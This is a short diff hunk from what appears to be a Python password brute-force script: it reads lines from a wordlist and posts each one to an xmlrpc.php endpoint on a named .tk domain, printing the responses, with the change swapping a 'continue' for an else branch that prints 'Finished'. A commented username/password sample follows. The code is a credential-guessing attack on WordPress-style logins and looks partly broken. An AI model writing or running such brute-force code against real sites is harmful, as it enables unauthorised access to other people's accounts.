@@ -11,7 +11,8 @@ with open(wordlist, 'r') as f:
         passwds = line
         r =requests.post('http://macaxeirateste.tk/xmlrpc.php', line)
         print(r.text)
-     continue
+     else: 
+        print("Finished")
      
     
 #data = {'username':'Olivia','password':'123'}
